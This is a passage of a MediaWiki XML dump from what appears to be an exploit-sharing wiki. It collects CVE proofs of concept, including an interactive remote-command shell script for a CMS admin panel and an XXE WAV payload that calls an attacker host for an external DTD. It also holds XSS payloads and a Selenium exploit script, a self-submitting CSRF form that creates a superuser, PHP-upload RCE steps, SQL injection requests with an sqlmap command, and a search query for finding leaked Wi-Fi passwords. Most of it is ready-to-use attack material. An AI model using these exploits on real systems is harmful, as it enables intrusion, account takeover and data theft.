%5Bvisible%5D=0&amp;toggleable_data%5Bheader%5D%5Bdebugger%5D=0&amp;toggleable_data%5Bheader%5D%5Btemplate%5D=0&amp;toggleable_data%5Bheader%5D%5Bappend_url_extension%5D=0&amp;toggleable_data%5Bheader%5D%5Broutes%5D%5Bdefault%5D=0&amp;toggleable_data%5Bheader%5D%5Broutes%5D%5Bcanonical%5D=0&amp;toggleable_data%5Bheader%5D%5Broutes%5D%5Baliases%5D=0&amp;toggleable_data%5Bheader%5D%5Badmin%5D%5Bchildren_display_order%5D=0&amp;toggleable_data%5Bheader%5D%5Blogin%5D%5Bvisibility_requires_access%5D=0'
	r = session.post(url+f"/admin/pages/{project_name}/:add",data=payload,headers=headers)

	## Getting command output
	r = session.get(url+f"/{project_name.lower()}")
	if 'SyntaxError' in r.text:
		print("[-] Command error")
	else:
		a = r.text.split('&lt;section id="body-wrapper" class="section"&gt;')
		b = a[1].split('&lt;/section&gt;')
		print(b[0][58:])


	# Cleaning up
	## Getting admin-nonce
	r = session.get(url + "/admin/pages")
	soup = BeautifulSoup(r.text, features="lxml")
	nonce = str(soup.findAll('input')[32])
	nonce = nonce[47:79]

	## Deleting Page
	r = session.get(url+f"/admin/pages/{project_name.lower()}/task:delete/admin-nonce:{nonce}")

login(url,username,password)

while True:
	cmd = input("$ ")
	rce(url,cmd)
&lt;/pre&gt;</text>
      <sha1>5pwjsjnfiwdvhok2g2lpj60vlzo3dlo</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-29447 Wordpress XXE漏洞</title>
    <ns>0</ns>
    <id>2251</id>
    <revision>
      <id>2681</id>
      <timestamp>2021-05-06T08:54:53Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Payload== &lt;pre&gt; echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM '"'"'http://attacker/evil.dtd'"'"'&gt;%remote;..."</comment>
      <origin>2681</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="216" sha1="id4gi2j5ozm3h83grq7ouusep61q8qc" xml:space="preserve">==Payload==
&lt;pre&gt;
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM '"'"'http://attacker/evil.dtd'"'"'&gt;%remote;%init;%trick;]&gt;\x00' &gt; payload.wav
&lt;/pre&gt;</text>
      <sha1>id4gi2j5ozm3h83grq7ouusep61q8qc</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-29460 Kirby CMS 3.5.3.1 XSS漏洞</title>
    <ns>0</ns>
    <id>1529</id>
    <revision>
      <id>1911</id>
      <timestamp>2021-04-28T12:04:46Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==XSS== &lt;pre&gt; # Exploit Title: Kirby CMS 3.5.3.1 - 'file' Cross-Site Scripting (XSS) # Date: 21-04-2021 # Exploit Author: Sreenath Raghunathan # Vendor Homepage: https://getki..."</comment>
      <origin>1911</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1260" sha1="hvrfjsou7py195ewh9z9ikn0y5vaotb" xml:space="preserve">==XSS==
&lt;pre&gt;
# Exploit Title: Kirby CMS 3.5.3.1 - 'file' Cross-Site Scripting (XSS)
# Date: 21-04-2021
# Exploit Author: Sreenath Raghunathan
# Vendor Homepage: https://getkirby.com/
# Software Link: https://github.com/getkirby/kirby
# Version: 3.5.3.1(REQUIRED)
# CVE : CVE-2021-29460

POST /api/users/&lt;userid&gt;/avatar HTTP/1.1
Host: &lt;host&gt;
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0)
Gecko/20100101 Firefox/87.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-CSRF: &lt;redacted&gt;
Content-Type: multipart/form-data;
boundary=---------------------------286121627839893676321700902916
Content-Length: 563

Connection: close
Cookie:
&lt;redacted&gt;



-----------------------------286121627839893676321700902916
Content-Disposition: form-data; name="file"; filename="svgxss.svg"
Content-Type: image/svg+xml

&lt;?xml version="1.0" standalone="no"?&gt;
&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;

&lt;svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg"&gt;
  &lt;polygon id="triangle" points="0,0 0,500 500,0" fill="#009900"
stroke="#004400"/&gt;
  "&gt;&lt;script&gt;alert(1)&lt;/script&gt;
&lt;/svg&gt;
-----------------------------286121627839893676321700902916--
            
&lt;/pre&gt;</text>
      <sha1>hvrfjsou7py195ewh9z9ikn0y5vaotb</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-29921 python3.8.0-v3.10 SSRF&amp;RFI漏洞</title>
    <ns>0</ns>
    <id>1570</id>
    <revision>
      <id>1966</id>
      <timestamp>2021-05-01T01:02:54Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==簡介== python stdlib “ipaddress” – Improper Input Validation of octal literals in python 3.8.0 thru v3.10 results in indeterminate SSRF &amp; RFI vulnerabilities. —..."</comment>
      <origin>1966</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2034" sha1="258k07io0ihj1cgfh2eyco2uk3qjvki" xml:space="preserve">==簡介==
python stdlib “ipaddress” – Improper Input Validation of octal literals in python 3.8.0 thru v3.10 results in indeterminate SSRF &amp; RFI vulnerabilities. — “ipaddress leading zeros in IPv4 address”


Improper input validation of octal strings in Python 3.8.0 thru v3.10 stdlib ipaddress allows unauthenticated remote attackers to perform indeterminate SSRF, RFI, and LFI attacks on many programs that rely on Python stdlib ipaddress. IP address octects are left stripped instead of evaluated as valid IP addresses. For example, an attacker submitting an IP address to a web application that relies on stdlib ipaddress, could cause SSRF via inputting octal input data; An attacker can submit exploitable IP addresses if the octet is 3 digits, with the minimum exploitable octect being 08 (Denial of Service) and the maximum exploitable octet is 099. For example, an attacker can submit 010.8.8.8, which is 8.8.8.8, yet Python ipaddress builtin will evaluate this as 10.8.8.8.


==POC==
Vulnerability added in python3.8

https://github.com/python/cpython/pull/12577

Documentated to be vulnerable in the changelog:

https://github.com/python/cpython/blob/63298930fb531ba2bb4f23bc3b915dbf1e17e9e1/Misc/NEWS.d/3.8.0a4.rst


&lt;pre&gt;
#!/usr/bin/env python
# Authors:      sickcodes, Victor Viale
# License:      GPLv3+
# Reference:    https://docs.python.org/3.10/library/ipaddress.html#ipaddress.IPv4Address

# Leading zeroes are tolerated only for values less than 8 (as there is no ambiguity between the decimal and octal interpretations of such strings).

import subprocess
import ipaddress

SUSPECT = '010.8.8.8'

print(ipaddress.ip_network(SUSPECT, strict=True))

BAD_IP = ipaddress.ip_address(SUSPECT)

print('http://'+str(BAD_IP))

print(str(subprocess.check_output("ping -W3 -v -c1 "+str(SUSPECT), shell=True, universal_newlines=True).strip()))

print(str(subprocess.check_output("ping -W3 -v -c1 "+str(BAD_IP), shell=True, universal_newlines=True).strip()))
&lt;/pre&gt;


==參考==
https://sick.codes/sick-2021-014/</text>
      <sha1>258k07io0ihj1cgfh2eyco2uk3qjvki</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-29996 Mark Text Markdown 編輯器RCE漏洞</title>
    <ns>0</ns>
    <id>2542</id>
    <revision>
      <id>3039</id>
      <timestamp>2021-05-22T02:28:05Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "Mark Text 0.16.3可以使攻擊者任意執行命令。通過打開包含變異跨站腳本（XSS）Payload的.md文件，這可能導致遠程執行代碼（RCE）  POC: &lt;pre..."</comment>
      <origin>3039</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="232" sha1="ljefj9uspamrdmyduscpr4vdtl1pmy7" xml:space="preserve">Mark Text 0.16.3可以使攻擊者任意執行命令。通過打開包含變異跨站腳本（XSS）Payload的.md文件，這可能導致遠程執行代碼（RCE）

POC:
&lt;pre&gt;
https://github.com/marktext/marktext/issues/2548
&lt;/pre&gt;</text>
      <sha1>ljefj9uspamrdmyduscpr4vdtl1pmy7</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-30030 CVE-2021-30034 CVE-2021-30039 CVE-2021-30042 RemoteClinic 2.0 存儲型XSS漏洞</title>
    <ns>0</ns>
    <id>1488</id>
    <revision>
      <id>1866</id>
      <timestamp>2021-04-22T09:27:45Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==XSS== &lt;pre&gt; # Exploit Title: RemoteClinic 2.0 - 'Multiple' Stored Cross-Site Scripting (XSS) # Date: 13/04/2021 # Exploit Author: Saud Ahmad # Vendor Homepage: https://remot..."</comment>
      <origin>1866</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2001" sha1="sb7nqngpayk1r9ab9h58d6yb2k88vlv" xml:space="preserve">==XSS==
&lt;pre&gt;
# Exploit Title: RemoteClinic 2.0 - 'Multiple' Stored Cross-Site Scripting (XSS)
# Date: 13/04/2021
# Exploit Author: Saud Ahmad
# Vendor Homepage: https://remoteclinic.io/
# Software Link: https://github.com/remoteclinic/RemoteClinic
# Version: 2.0
# Tested on: Windows 10
# CVE : CVE-2021-30030, CVE-2021-30034, CVE-2021-30039, CVE-2021-30042

#Steps to Reproduce:

1)Login in Application as Doctor.
2)Register a Patient with Full Name Field as XSS Payload: XSS"&gt;&lt;img src=x onerror=alert(`XSS-BY-Saud-Ahmad`)&gt;
3)After Register Patient, go to "Patients" endpoint.
4)XSS Executed.

For Detail POC: https://github.com/remoteclinic/RemoteClinic/issues/1

#Steps to Reproduce:

1)Login in Application as Doctor.
2)Register a Patient.
3)After Register Patient, a page redirect to Register Report Page. 
4)Here is "Symptoms" Field as XSS Payload: XSS"&gt;&lt;img src=x onerror=alert(`XSS-BY-Saud-Ahmad`)&gt;
4)After Register Report, Click on home which is "dashboard" endpoint.
5)XSS Executed.

For Detail POC: https://github.com/remoteclinic/RemoteClinic/issues/5

#Steps to Reproduce:

1)Login in Application as Doctor.
2)Register a Patient.
3)After Register Patient, a page redirect to Register Report Page. 
4)When you scroll down page two fields there "Fever" and "Blood Pressure", both are vulnerable to XSS, inject XSS Payload in both Fields: XSS"&gt;&lt;img src=x onerror=alert(`XSS-BY-Saud-Ahmad`)&gt;
4)After Register Report, Click on home.
5)Now Click on Report, XSS Executed.

For Detail POC: https://github.com/remoteclinic/RemoteClinic/issues/8

#Steps to Reproduce:

1)Login in Application as Doctor.
2)Register a New Clinic.
3)Here is four fields "Clinic Name", "Clinic Address", "Clinic City" and "Clinic Contact". All are vulnerable to XSS. 
4)Inject XSS Payload in all Fields: XSS"&gt;&lt;img src=x onerror=alert(`XSS-BY-Saud-Ahmad`)&gt;
4)Now go to Clinic Directory.
5)Click on that Clinic.
6)XSS Executed.

For Detail POC: https://github.com/remoteclinic/RemoteClinic/issues/11

            
&lt;/pre&gt;</text>
      <sha1>sb7nqngpayk1r9ab9h58d6yb2k88vlv</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-30044 RemoteClinic 2 XSS漏洞</title>
    <ns>0</ns>
    <id>1471</id>
    <revision>
      <id>1848</id>
      <timestamp>2021-04-21T10:07:56Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==XSS== &lt;pre&gt; # Exploit Title: RemoteClinic 2 - 'Multiple' Cross-Site Scripting (XSS) # Exploit Author: nu11secur1ty # Debug: g3ck0dr1v3r # Date: 04/21/2021 # Vendor Homepage:..."</comment>
      <origin>1848</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3087" sha1="c8m3rv8wxrqtq47pue9uvm3b6au70p9" xml:space="preserve">==XSS==
&lt;pre&gt;
# Exploit Title: RemoteClinic 2 - 'Multiple' Cross-Site Scripting (XSS)
# Exploit Author: nu11secur1ty
# Debug: g3ck0dr1v3r
# Date: 04/21/2021
# Vendor Homepage: https://remoteclinic.io/
# Software Link: https://github.com/remoteclinic/RemoteClinic
# CVE: CVE-2021-30044

[+] Exploit Source:
https://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2021-30044

[Exploit Program Code]

#!/usr/bin/python3
# Author: @nu11secur1ty
# Debug: g3ck0dr1v3r
# CVE-2021-30044

from selenium import webdriver
import time


#enter the link to the website you want to automate login.
website_link="http://localhost/RemoteClinic/login/"

#enter your login username
username="admin@domain.ext"

#enter your login password
password="remoteclinic"

#enter the element for username input field
element_for_username="user_id"
#enter the element for password input field
element_for_password="password"
#enter the element for submit button
element_for_submit="submit"

# Dai brauzura aaa ta eba
browser = webdriver.Chrome() #uncomment this line,for chrome users
#browser = webdriver.Firefox() #uncomment this line,for chrome users
#browser = webdriver.Safari() #for macOS users[for others use chrome vis
chromedriver]

# Otvarai da ne vlazam s kasata
browser.get((website_link))

# Run...
try:
username_element = browser.find_element_by_name(element_for_username)
username_element.send_keys(username)
password_element  = browser.find_element_by_name(element_for_password)
password_element.send_keys(password)

### Login
signInButton = browser.find_element_by_name(element_for_submit)
signInButton.click()

### Exploit
element_for_natrutvanie="submit"
browser.get(("http://localhost/RemoteClinic/staff/register.php"))

### Inner text...
browser.execute_script("document.querySelector('[name=\"first_name\"]').value
= '&lt;img src=1 onerror=alert(`Please_fix_it`)&gt;'")
browser.execute_script("document.querySelector('[name=\"last_name\"]').value
= '&lt;img src=1 onerror=alert(`Please_fix_it`)&gt;'")
browser.execute_script("document.querySelector('[name=\"userid\"]').value =
'nu11secur1ty@gmail.com'")
browser.execute_script("document.querySelector('[name=\"passkey\"]').value
= 'password'")
browser.execute_script("document.querySelector('[name=\"contact\"]').value
= '123456789'")
browser.execute_script("document.querySelector('[name=\"mobile\"]').value =
'12345678910'")
browser.execute_script("document.querySelector('[name=\"skype\"]').value =
'nu11secur1ty'")
browser.execute_script("document.querySelector('[name=\"address\"]').value
= 'Kurec A 31'")
browser.find_element_by_name('image').send_keys("C:\\Users\\nu11secur1ty\\Desktop\\CVE\\CVE-2021-30044\\nu11secur1ty.png")
time.sleep(5)

# Submit exploit
signInButton = browser.find_element_by_name(element_for_natrutvanie)
signInButton.click()

# Maani sa i testwai posle
time.sleep(1)
browser.get(("http://localhost/RemoteClinic/login/signout.php"))
browser.close()


print("payload is deployed...\n")
except Exception:

#### This exception occurs if the element are not found in the webpage.
print("Some error occured :(")
            
&lt;/pre&gt;</text>
      <sha1>c8m3rv8wxrqtq47pue9uvm3b6au70p9</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-30147 DMA Radius Manager 4.4.0 跨站請求偽造（CSRF）</title>
    <ns>0</ns>
    <id>974</id>
    <revision>
      <id>1248</id>
      <timestamp>2021-04-08T08:06:56Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: DMA Radius Manager 4.4.0 - Cross-Site Request Forgery (CSRF) # Date: April 8, 2021 (04/08/2021) # Exploit Author: Issac Briones # Vendor Homepag..."</comment>
      <origin>1248</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2756" sha1="fke2vrsipq8jmmrf2s8s6xppeetj6hz" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: DMA Radius Manager 4.4.0 - Cross-Site Request Forgery (CSRF)
# Date: April 8, 2021 (04/08/2021)
# Exploit Author: Issac Briones
# Vendor Homepage: http://www.dmasoftlab.com/
# Software Download: https://sourceforge.net/projects/radiusmanager/
# Version: 4.4.0
# CVE: CVE-2021-30147

&lt;html&gt;
	&lt;body&gt;
		&lt; ! -- Change IP addr to IP addr that RADIUS manager is located -- &gt;
		&lt;form action="http://192.168.1.2/admin.php?cont=store_user" method="POST"&gt;
			&lt;input type="hidden" name="username" value="csrf_usr" /&gt;
			&lt;input type="hidden" name="enableuser" value="1" /&gt;
			&lt;input type="hidden" name="acctype" value="0" /&gt;
			&lt;input type="hidden" name="password1" value="csrfusr" /&gt;
			&lt;input type="hidden" name="password2" value="csrfusr" /&gt;
			&lt;input type="hidden" name="maccm" value="" /&gt;
			&lt;input type="hidden" name="mac" value="" /&gt;
			&lt;input type="hidden" name="ipmodecpe" value="0" /&gt;
			&lt;input type="hidden" name="simuse" value="1" /&gt;
			&lt;input type="hidden" name="firstname" value="" /&gt;
			&lt;input type="hidden" name="lastname" value="" /&gt;
			&lt;input type="hidden" name="company" value="" /&gt;
			&lt;input type="hidden" name="address" value="" /&gt;
			&lt;input type="hidden" name="city" value="" /&gt;
			&lt;input type="hidden" name="zip" value="" /&gt;
			&lt;input type="hidden" name="country" value="" /&gt;
			&lt;input type="hidden" name="state" value="" /&gt;
			&lt;input type="hidden" name="phone" value="" /&gt;
			&lt;input type="hidden" name="mobile" value="" /&gt;
			&lt;input type="hidden" name="email" value="" /&gt;
			&lt;input type="hidden" name="taxid" value="" /&gt;
			&lt;input type="hidden" name="srvid" value="0" /&gt;
			&lt;input type="hidden" name="downlimit" value="0" /&gt;
			&lt;input type="hidden" name="uplimit" value="0" /&gt;
			&lt;input type="hidden" name="comblimit" value="0" /&gt;
			&lt;input type="hidden" name="expiration" value="2021-04-06" /&gt;
			&lt;input type="hidden" name="uptimelimit" value="00:00:00" /&gt;
			&lt;input type="hidden" name="credits" value="0.00" /&gt;
			&lt;input type="hidden" name="contractid" value="" /&gt;
			&lt;input type="hidden" name="contractvalid" value="" /&gt;
			&lt;input type="hidden" name="gpslat" value="" /&gt;
			&lt;input type="hidden" name="gpslong" value="" /&gt;
			&lt;input type="hidden" name="comment" value="" /&gt;
			&lt;input type="hidden" name="superuser" value="{SUPERUSER}" /&gt;
			&lt;input type="hidden" name="lang" value="English" /&gt;
			&lt;input type="hidden" name="groupid" value="1" /&gt;
			&lt;input type="hidden" name="custattr" value="" /&gt;
			&lt;input type="hidden" name="cnic" value="" /&gt;
			&lt;input type="hidden" name="cnicfile1" value="(binary)" /&gt;
			&lt;input type="hidden" name="cnicfile2" value="(binary)" /&gt;
			&lt;input type="hidden" name="adduser" value="Add user" /&gt;
		&lt;/form&gt;
	&lt;script&gt;
		document.forms[0].submit();
	&lt;/script&gt;
	&lt;/body&gt;

&lt;/html&gt;
&lt;/pre&gt;</text>
      <sha1>fke2vrsipq8jmmrf2s8s6xppeetj6hz</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-30149 Composr 10.0.36 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>975</id>
    <revision>
      <id>1249</id>
      <timestamp>2021-04-08T08:09:01Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Composr 10.0.36 - Remote Code Execution # Date: 04/06/2021 # Exploit Author: Orion Hridoy # Vendor Homepage: https://compo.sr/ # Software Link:..."</comment>
      <origin>1249</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1421" sha1="0l0m9woos7ftr4j4w58kgs2n4ub6dpt" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Composr 10.0.36 - Remote Code Execution
# Date: 04/06/2021
# Exploit Author: Orion Hridoy
# Vendor Homepage: https://compo.sr/
# Software Link: https://compo.sr/download.htm
# Version: 10.0.36
# Tested on: Windows/Linux
# CVE : CVE-2021-30149

A RCE on Composr CMS has been discovered by BugsBD Private LTD. We have a galleries security issue which allows us to upload a PHP file. Whenever we upload an image from galleries, Composr allows us to upload only images. If we tried to upload a PHP file from galleries uploader it will say someone attempting hacking activities. But we have a security issue on the Upload In Bulk section. Whenever we check allowed extension in Upload in bulk function we can see PHP is completely prohibited. But whenever we tamper the request and change the extension we can see it will upload the PHP file without other or server side verification. This allows a user to upload malicious file even when they restricted it.

Steps To Reproduce:
1. Go to upload galleries.
2. Upload a image and tamper the request and change the extension from .jpg to .php
3. It will say hacking attempts, check the allowed extension and you can see it's not accepting PHP extension.
4. Now go to upload in bulk option.
5. Upload a image with PHP codes and tamper the request.
6. Change extension from .jpg to .php
7. It will get uploaded with the blocked PHP extension.
&lt;/pre&gt;</text>
      <sha1>0l0m9woos7ftr4j4w58kgs2n4ub6dpt</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-30157 MediaWiki 小於1.3.1.2 XSS漏洞</title>
    <ns>0</ns>
    <id>2541</id>
    <revision>
      <id>3038</id>
      <timestamp>2021-05-22T02:26:15Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==影響版本== &lt;pre&gt; MediaWiki &lt;1.3.1.2 &lt;/pre&gt;  ==漏洞利用== 編輯rcfilters-filter-*-label消息之一（例如，編輯MediaWiki:Rcfilters-filter-humans-label），並..."</comment>
      <origin>3038</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="332" sha1="o9c1mhq5pnlq085q94dj2ro6srdnapj" xml:space="preserve">==影響版本==
&lt;pre&gt;
MediaWiki &lt;1.3.1.2
&lt;/pre&gt;

==漏洞利用==
編輯rcfilters-filter-*-label消息之一（例如，編輯MediaWiki:Rcfilters-filter-humans-label），並添加一個簡單的XSS Payload，例如：
&lt;pre&gt;
&lt;img src=x onerror=alert(document.domain)&gt;
&lt;/pre&gt;

訪問Special:RecentChanges並查看執行的JavaScript</text>
      <sha1>o9c1mhq5pnlq085q94dj2ro6srdnapj</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-30175 ZEROF Web Server 1.0 (April 2021 version) 登錄頁面SQL注入漏洞</title>
    <ns>0</ns>
    <id>1302</id>
    <revision>
      <id>1633</id>
      <timestamp>2021-04-13T13:14:07Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; POST /HandleEvent HTTP/1.1 Host: zerof User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0 Accept: */* Accept-Language: ru..."</comment>
      <origin>1633</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="869" sha1="b3w4s7wadhfj2b9nk0a52l41lmigdxy" xml:space="preserve">==EXP==
&lt;pre&gt;
POST /HandleEvent HTTP/1.1
Host: zerof
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0
Accept: */*
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 126

Ajax=1&amp;IsEvent=1&amp;Obj=O4F&amp;Evt=click&amp;this=O4F&amp;"_fp_=_S_ID=CteTYLjmYw108029DC1&amp;O33=%020%02%02'&amp;O37=%020%02%02fff"&amp;_seq_=2&amp;_uo_=O
&lt;/pre&gt;


&lt;pre&gt;
HTTP/1.1 200 OK
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 209
Date: Wed, 07 Apr 2021 10:33:44 GMT
Server: ZEROF Web Server

try{_rsov_(O33,0);_rsov_(O37,0);}finally{alert("#42000You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''')' at line 1.");}
&lt;/pre&gt;</text>
      <sha1>b3w4s7wadhfj2b9nk0a52l41lmigdxy</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-30176 ZEROF Expert pro/2.0 application for mobile devices SQL注入漏洞</title>
    <ns>0</ns>
    <id>1303</id>
    <revision>
      <id>1634</id>
      <timestamp>2021-04-13T13:16:02Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; POST /v2/devices/add HTTP/1.1 Host: zerof Content-Type: application/x-www-form-urlencoded; charset=utf-8 Accept: */* Connection: close Date: Thu, 07 Apr 2021 13:..."</comment>
      <origin>1634</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1033" sha1="rcr8zs84m009ocz4ai918b757tkpr33" xml:space="preserve">==EXP==
&lt;pre&gt;
POST /v2/devices/add HTTP/1.1
Host: zerof
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Accept: */*
Connection: close
Date: Thu, 07 Apr 2021 13:40:57 +0300
Content-Length: 241
User-Agent: ZEROF Expert pro/2.0 (com.zerof.expertpro; build:2; iOS 14.4.0) Alamofire/4.8.2
Accept-Language: ru-RU;q=1.0
Authorization: ZWS admin':e4NQCMRQELfsoddJwJPz/YoB3ak=
Accept-Encoding: gzip, deflate

device=?unrecognized?&amp;geo=55.70402368871489%2C37.615802664058954&amp;os=iOS%2014.4&amp;token=f9Q0hE5JRpE%3AAPA91bFP19KGIIwJyLrbTuLwtP_jUvkUqqFM_k4W8czxm3ajT5Rh0jD2OHO_NmRIeY1C9zjzzNS_ch8VlNy2Bnqj5FcIdrWIFEevprpMGf3k96uFHuUsaa3aF8FS-RGwIsY8AXcUYcOP
&lt;/pre&gt;

&lt;pre&gt;
HTTP/1.1 500 Internal Server Error
Connection: close
Content-Type: application/json; charset=utf-8
Content-Length: 176
Date: Wed, 07 Apr 2021 10:35:59 GMT
Server: ZEROF Web Server

&lt;html&gt; #42000You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''admin'')' at line 1 &lt;/html&gt;
&lt;/pre&gt;</text>
      <sha1>rcr8zs84m009ocz4ai918b757tkpr33</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-3017 Intelbras Wireless 未授權&amp;密碼洩露漏洞</title>
    <ns>0</ns>
    <id>2266</id>
    <revision>
      <id>2701</id>
      <timestamp>2021-05-07T08:27:34Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==FOFA== &lt;pre&gt; body="def_wirelesspassword" &lt;/pre&gt;  ==漏洞利用== 查看源代碼即可獲得密碼信息。 搜索&lt;code&gt;def_wirelesspassword&lt;/code&gt;"</comment>
      <origin>2701</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="150" sha1="e3mhyw2wv7bw0o8ebb5lpy86niag74v" xml:space="preserve">==FOFA==
&lt;pre&gt;
body="def_wirelesspassword"
&lt;/pre&gt;

==漏洞利用==
查看源代碼即可獲得密碼信息。
搜索&lt;code&gt;def_wirelesspassword&lt;/code&gt;</text>
      <sha1>e3mhyw2wv7bw0o8ebb5lpy86niag74v</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-3018 IPeakCMS 3.5 SQL注入漏洞</title>
    <ns>0</ns>
    <id>3276</id>
    <revision>
      <id>3827</id>
      <timestamp>2021-06-01T02:57:17Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==簡介== IPeakCMS3.5存在遠程SQL盲注漏洞。 &lt;/translate&gt;  ==POC== &lt;pre&gt; Use SQLmap if you've found the valid id... e.g: sqlmap -u "site.com/..."</comment>
      <origin>3827</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="282" sha1="600gz1jn092pk6s5vik094yw4gpl3dn" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==簡介==
IPeakCMS3.5存在遠程SQL盲注漏洞。
&lt;/translate&gt;

==POC==
&lt;pre&gt;
Use SQLmap if you've found the valid id...
e.g: sqlmap -u "site.com/cms/print.php?id=1" --dbs
Payload : id=(SELECT (CASE WHEN(3104=3104) THEN 1 ELSE (SELECT 8458) END))
&lt;/pre&gt;</text>
      <sha1>600gz1jn092pk6s5vik094yw4gpl3dn</sha1>
    </revision>
    <revision>
      <id>3828</id>
      <parentid>3827</parentid>
      <timestamp>2021-06-01T02:57:39Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>3828</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="293" sha1="e8wjsgnb1z80tmt4xwh5y079ny2p7g6" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==簡介== &lt;!--T:1--&gt;
IPeakCMS3.5存在遠程SQL盲注漏洞。
&lt;/translate&gt;

==POC==
&lt;pre&gt;
Use SQLmap if you've found the valid id...
e.g: sqlmap -u "site.com/cms/print.php?id=1" --dbs
Payload : id=(SELECT (CASE WHEN(3104=3104) THEN 1 ELSE (SELECT 8458) END))
&lt;/pre&gt;</text>
      <sha1>e8wjsgnb1z80tmt4xwh5y079ny2p7g6</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-3018 IPeakCMS 3.5 SQL注入漏洞/es</title>
    <ns>0</ns>
    <id>4029</id>
    <revision>
      <id>4646</id>
      <timestamp>2021-06-10T03:06:38Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Introducción == IPeakCMS3.5 tiene una vulnerabilidad de inyección ciega de SQL remoto."</comment>
      <origin>4646</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="296" sha1="a8d3gln3hiy8uce7or5crrha2rg6krb" xml:space="preserve">&lt;languages /&gt;
== Introducción ==
